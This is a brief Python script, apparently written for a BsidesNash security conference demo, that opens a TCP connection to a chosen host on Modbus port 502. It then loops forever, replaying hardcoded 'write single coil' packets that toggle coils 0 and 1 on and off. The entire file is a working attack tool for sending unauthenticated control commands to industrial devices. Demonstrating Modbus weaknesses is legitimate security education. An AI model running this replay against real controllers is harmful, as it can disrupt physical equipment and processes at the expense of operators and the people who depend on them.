#!/usr/bin/env python3
# Author: Stephen J. Hilt
#   Written for BsidesNash with Chris Sistrunk to demo
#   how replay of Modbus packets work.
#
# Converted to Python 3 — byte string literals (b"...") replace the
# Python 2 str literals, and socket.send() sends bytes directly.
#
#########################################################

import socket
import sys
import time


# Argument Checking
if len(sys.argv) != 2:
    print("USAGE: python3 ./modturnt.py <host>")
    sys.exit()

# host is passed in via cli arguments
host = sys.argv[1]
# modbus port
port = 502

# make the socket and the connection to the host and port specified
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
except socket.error:
    print("\n||\n|| Connection unsuccessful...\n||\n")
    sys.exit()

# Set Coil 0/1 to 1 (Turn on lights)
turnt_1 = b"\x00\x02\x00\x00\x00\x06\x01\x05\x00\x01\xff\x00"
turnt_2 = b"\x00\x02\x00\x00\x00\x06\x01\x05\x00\x00\xff\x00"
# Set Coil 0/1 to 0 (Turn off lights)
turndown_1 = b"\x00\x02\x00\x00\x00\x06\x01\x05\x00\x01\x00\x00"
turndown_2 = b"\x00\x02\x00\x00\x00\x06\x01\x05\x00\x00\x00\x00"

# infinite loop to toggle lights
try:
    while True:
        # send the packets
        sock.send(turnt_1)
        sock.recv(4096)
        time.sleep(1)
        sock.send(turnt_2)
        sock.recv(4096)
        time.sleep(1)
        sock.send(turndown_1)
        sock.recv(4096)
        time.sleep(1)
        sock.send(turndown_2)
        sock.recv(4096)
        time.sleep(1)
except KeyboardInterrupt:
    print("\nInterrupted by user.")

# close the socket.
sock.close()
sys.exit()
